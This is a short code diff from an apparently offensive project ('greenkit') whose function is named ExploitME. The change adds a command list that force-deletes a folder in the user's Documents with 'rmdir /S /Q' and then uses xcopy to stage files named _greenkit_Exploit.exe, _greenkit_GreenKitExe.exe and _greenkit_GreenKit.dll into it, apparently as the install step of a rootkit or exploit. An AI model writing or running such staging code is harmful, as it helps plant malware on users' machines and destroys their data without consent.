@@ -63,13 +63,8 @@ int ExploitME()
 		);
 
 	Sleep(1000);
-
-	char profilepath[250];
-	ExpandEnvironmentStringsA("%userprofile%", profilepath, 250);
-
-	char* exploit_path = strcat(profilepath, "\\Documents\\_greenkit_folder\\_greenkit_Exploit.exe");
-
-    PCHAR copy[] = {
+	
+	PCHAR copy[] = { "rmdir /S /Q %USERPROFILE%\\Documents\\_greenkit_folder",
         "xcopy _greenkit_Exploit.exe %USERPROFILE%\\Documents\\_greenkit_folder\\ /s",
 		"xcopy _greenkit_GreenKitExe.exe %USERPROFILE%\\Documents\\_greenkit_folder\\ /s",
 		"xcopy _greenkit_GreenKit.dll %USERPROFILE%\\Documents\\_greenkit_folder\\ /s",
